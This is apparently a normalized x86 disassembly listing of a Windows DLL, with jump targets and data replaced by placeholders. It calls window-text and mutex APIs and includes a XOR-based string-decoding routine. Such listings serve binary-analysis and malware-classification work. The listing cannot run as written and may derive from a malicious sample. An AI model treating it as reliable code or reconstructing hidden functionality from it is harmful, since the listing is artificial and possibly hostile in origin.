call [ GetWindowThreadProcessId@IAT ]
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x20c ]
[ edi ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push ebx
call [ GetWindowTextW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
xor ecx ecx
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x214 ] 0x7
mov [ ebp - 0x218 ] 0x0
mov [ ebp - 0x228 ] cx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x20c ]
push edx
lea ecx [ ebp - 0x228 ]
call sub_1005ddc0
mov edx [ esi + 0x4 ]
mov eax edx
lea edi [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea eax [ ebp - 0x228 ]
push eax
call sub_10056a70
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x214 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x22c ]
xor eax eax
mov [ esi ] ecx
lea edx [ esi + 0x8 ]
movzx esi ax
mov eax esi
shl esi 0x10
or eax esi
mov esi [ ebp - 0x214 ]
mov ecx 0x82
mov edi edx
[ edi ]
mov edi [ ebp - 0x228 ]
mov eax edi
cmp esi 0x8
jae r-xdata
mov edx [ ebp - 0x228 ]
push edx
call sub_100187af
add esp 0x4
lea ecx [ ebx + ebx ]
push ecx
push eax
push edx
call sub_1007f5d0
add esp 0xc
cmp esi 0x8
jb r-xdata
lea eax [ ebp - 0x228 ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
push edi
call sub_100187af
add esp 0x4
sub_10051a10
push ebp
mov ebp esp
push ecx
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x10
mov eax [ eax + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
push eax
mov eax [ ecx + 0xf0 ]
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x30 ]
call eax
sub_10051a80
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx eax
sub ecx ebx
sar ecx 0x2
mov eax ecx
cdq
sub eax edx
push edi
mov edi eax
sar edi 0x1
mov [ ebp - 0x8 ] ecx
test edi edi
jle r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ edi + edi + 0x2 ]
jmp r-xdata
mov eax [ ebx + edi * 4 - 0x4 ]
dec edi
sub esi 0x2
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] edi
cmp esi ecx
jge r-xdata
jne r-xdata
mov ecx [ ebx + esi * 4 - 0x4 ]
mov edx [ ebx + esi * 4 ]
push ecx
push edx
call [ ebp + 0x8 ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
push edi
call sub_100231e0
add esp 0xc
test edi edi
jg r-xdata
mov edx [ ebx + ecx * 4 - 0x4 ]
mov eax [ ebp - 0x4 ]
dec ecx
mov [ ebx + eax * 4 ] edx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + esi * 4 ]
mov [ ebp - 0x4 ] esi
lea esi [ esi + esi + 0x2 ]
mov [ ebx + ecx * 4 ] eax
cmp esi [ ebp - 0x8 ]
jl r-xdata
dec esi
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
pop esi
mov ecx [ ebp - 0x8 ]
cmp esi ecx
sub_10051b1e
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10046f48
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10051bc0
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push esi
mov esi ecx
mov ecx [ eax + 0xf4 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x4
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x210 ]
push edx
call [ StrCpyW@IAT ]
lea ecx [ ebp - 0x210 ]
xor esi esi
call sub_10061c30
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0xe8 ] 0x0
mov [ eax + 0xf0 ] 0x0
mov [ eax + 0xec ] 0x1
mov eax [ eax + 0xf4 ]
push eax
call [ ReleaseMutex@IAT ]
mov eax esi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea esi [ eax + 0x8 ]
sub_10051c68
push 0x10
push r--data
call sub_1007fb20
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10051d2a
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_10044649
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_1007fb65
retn
call sub_1002f519
call sub_1002f519
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_100820b0
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_10051d44
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call sub_1001a35b
add esp 0x10
mov edi eax
test esi esi
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_100091c8
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax edi
sub_10051df0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_10051e20
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x1
jne r-xdata
call sub_10065830
test eax eax
jne r-xdata
call sub_1004e470
test eax eax
jne r-xdata
mov ecx eax
call sub_10018c90
test eax eax
je r-xdata
mov eax 0x1
pop ecx
pop ebp
retn
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ rw-data ] 0x1
mov eax 0x2
pop ecx
pop ebp
retn
xor eax eax
pop ecx
pop ebp
retn
sub_10051e6e
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_10051f30
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax + 0x12c ]
test esi esi
jne r-xdata
push edi
lea edi [ eax + 0x130 ]
lea edx [ ebp - 0x34 ]
lea eax [ esi + 0x16 ]
call sub_10053240
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push edi
push esi
call sub_10028d20
mov esi [ esi + 0x4 ]
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
sub_10051fc0
push ebp
mov ebp esp
sub esp 0xf8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov eax [ ebp + 0xc ]
mov [ ebp - 0xf0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc0 ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0xbc ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0xf8 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc8 ] ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0xb4 ] edx
mov edx [ ebp + 0x24 ]
mov [ ebp - 0xc4 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0xcc ] ecx
mov ecx [ ebp + 0x2c ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xf4 ] edx
mov edx [ ebp + 0x30 ]
mov [ ebp - 0xdc ] eax
mov eax [ ebp + 0x34 ]
mov [ ebp - 0xb8 ] ecx
mov ecx [ ebp + 0x38 ]
xor edi edi
mov [ ebp - 0xec ] edx
mov edx [ ebp + 0x3c ]
mov [ ebp - 0xe4 ] eax
mov eax [ ebp + 0x40 ]
mov [ ebp - 0xd0 ] ecx
mov ecx [ ebp + 0x44 ]
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ ebp - 0xd8 ] edx
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0xe8 ] ecx
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x3b
call sub_10053240
mov eax [ esi ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x114
call sub_10053240
mov [ esi + 0x4 ] edi
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x4 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0xd4 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0xd4 ]
push edx
push ebx
push eax
mov [ esi ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi ] edi
lea edx [ ebp - 0xa8 ]
mov eax 0x10c
call sub_10053240
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xc0 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xf0 ]
cmp eax edi
je r-xdata
push r--data
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push r--data
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc0 ]
push ebx
push ecx
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
lea edx [ ebp - 0x2c ]
mov eax 0xbc
call sub_10053240
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
mov [ esi + 0x8 ] eax
call sub_1007f5d0
mov ebx [ ebp - 0xbc ]
add esp 0xc
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0xbf
call sub_10053240
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x10 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xbc ]
push ebx
push ecx
push eax
mov [ esi + 0xc ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x131
call sub_10053240
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xc8 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xf8 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x36
call sub_10053240
mov eax [ esi + 0x18 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc8 ]
push ebx
push ecx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x49
call sub_10053240
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xb4 ]
push ebx
push ecx
push eax
mov [ esi + 0x18 ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x18 ] edi
mov ebx [ ebp - 0xb4 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x7f
call sub_10053240
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x20 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc4 ]
push ebx
push ecx
push eax
mov [ esi + 0x1c ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x1c ] edi
mov ebx [ ebp - 0xc4 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x10f
call sub_10053240
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x2c ] eax
jmp r-xdata
mov eax [ ebp - 0xf4 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0xcc ]
cmp eax edi
je r-xdata
mov [ esi + 0x28 ] edi
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0xdc ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0xec ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x30 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xb8 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xe4 ]
cmp eax edi
je r-xdata
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x34 ] eax
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xb8 ]
push ebx
push ecx
push eax
mov [ esi + 0x30 ] eax
call sub_1007f5d0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x30 ] edi
lea edx [ ebp - 0x34 ]
mov eax 0x43
call sub_10053240
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x24 ] eax
jmp r-xdata
mov eax [ ebp - 0xd8 ]
cmp eax edi
je r-xdata
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x38 ] eax
mov eax [ ebp - 0xd0 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0xd
call sub_10053240
push eax
call sub_10035937
cdq
add esp 0x4
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] edx
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x5a
call sub_10053240
push eax
call sub_10035937
add esp 0x4
mov [ esi + 0x4c ] eax
jmp r-xdata
mov eax [ ebp - 0xe0 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x5c
call sub_10053240
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov [ esi + 0x48 ] 0x989680
mov eax esi
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x40
push eax
call sub_10035937
mov [ esi + 0x48 ] eax
add esp 0x4
mov eax esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x40
mov eax [ ebp - 0xe8 ]
cmp eax edi
je r-xdata
sub_100524c0
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] 0x0
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x4 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10052500
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x28
je r-xdata
lea ecx [ esi + 0x24 ]
push ecx
push edi
call sub_1005e540
add esp 0x8
cmp eax 0x29
je r-xdata
cmp eax 0x18
jne r-xdata
push esi
push edi
call sub_10021f70
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x18 ]
push eax
push edi
call sub_10021f70
add esp 0x8
push esi
push edi
call sub_10021f70
add esp 0x8
pop edi
pop esi
pop ebp
retn
sub_10052560
push ebp
mov ebp esp
push 0xffffffff
push sub_10088221
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x68 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ecx
mov ecx [ ebp + 0x24 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x60 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ edi ] ecx
lea ecx [ edi + 0x4 ]
mov [ ebp - 0x54 ] eax
xor ebx ebx
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] ax
mov eax edx
lea esi [ eax + 0x2 ]
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x5c ] esi
mov si [ eax ]
add eax 0x2
cmp si bx
jne r-xdata
sub eax [ ebp - 0x5c ]
sar eax 0x1
push eax
push edx
call sub_1005ddc0
mov eax [ ebp - 0x4c ]
lea ecx [ edi + 0x20 ]
mov [ ebp - 0x4 ] ebx
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] dx
lea edx [ eax + 0x2 ]
mov si [ eax ]
add eax 0x2
cmp si bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ ebp - 0x4c ]
push eax
call sub_1005ddc0
mov cx [ ebp + 0xc ]
mov esi [ ebp - 0x68 ]
mov dl [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x1
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax esi
mov [ edi + 0x3c ] cx
mov [ edi + 0x3e ] dl
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea ecx [ eax + 0x2 ]
lea ebx [ ebx ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_1005ddc0
mov edx [ ebp - 0x64 ]
lea ecx [ ebp - 0x2c ]
push ecx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_1001ccb0
push eax
lea esi [ edi + 0x40 ]
mov edx r--data
mov [ ebp - 0x4 ] 0x3
call sub_1001ccb0
add esp 0x8
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov esi 0x7
xor eax eax
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
push 0xffffffff
lea ecx [ edi + 0x5c ]
mov [ ebp - 0x2c ] dx
mov edx [ ebp - 0x58 ]
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ecx ] ax
call sub_100404a0
mov edx [ ebp - 0x50 ]
push 0xffffffff
lea ecx [ edi + 0x78 ]
mov [ ebp - 0x4 ] 0x7
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_100404a0
mov edx [ ebp - 0x60 ]
push 0xffffffff
lea ecx [ edi + 0x94 ]
mov [ ebp - 0x4 ] 0x8
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_100404a0
mov edx [ ebp - 0x54 ]
push 0xffffffff
lea ecx [ edi + 0xb0 ]
mov [ ebp - 0x4 ] 0x9
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_100404a0
mov eax [ ebp + 0x2c ]
mov ecx [ ebp + 0x30 ]
mov [ edi + 0xcc ] eax
mov [ edi + 0xd0 ] ecx
mov [ edi + 0xd4 ] bx
mov [ edi + 0xd6 ] bl
mov [ edi + 0xd8 ] ebx
mov [ edi + 0xdc ] ebx
mov [ edi + 0xe0 ] ebx
mov [ edi + 0xe4 ] 0x3
mov [ edi + 0xe8 ] ebx
mov [ edi + 0xec ] ebx
mov [ edi + 0xf0 ] ebx
mov [ edi + 0xf4 ] ebx
mov [ edi + 0xf8 ] ebx
mov [ ebp - 0x4 ] 0xb
mov ecx edi
mov [ edi + 0x100 ] ebx
mov [ edi + 0x104 ] 0xd
mov [ edi + 0x108 ] 0xf
mov [ edi + 0x10c ] 0x32
call sub_10039ea0
mov eax [ edi + 0xf0 ]
cmp eax [ edi + 0xf4 ]
je r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
push ebx
push esi
push esi
push ebx
call [ CreateSemaphoreW@IAT ]
mov [ edi + 0xe8 ] eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x2c
mov edx [ edi + 0x100 ]
lea esp [ esp ]
add eax 0x1c
cmp eax [ edi + 0xf4 ]
jne r-xdata
mov edx ecx
mov [ edi + 0x100 ] edx
mov ecx [ eax + 0x10 ]
cmp ecx edx
jbe r-xdata
sub_10052840
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_1005289c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
push 0x16
pop eax
pop ebp
retn
sub_100528c9
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi 0xffff
push esi
push 0x133f
call sub_1002b306
fld [ ebp + 0x8 ]
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov edi eax
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_100329c9
pop ecx
pop ecx
test eax eax
jle r-xdata
push esi
push edi
call sub_1002b306
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
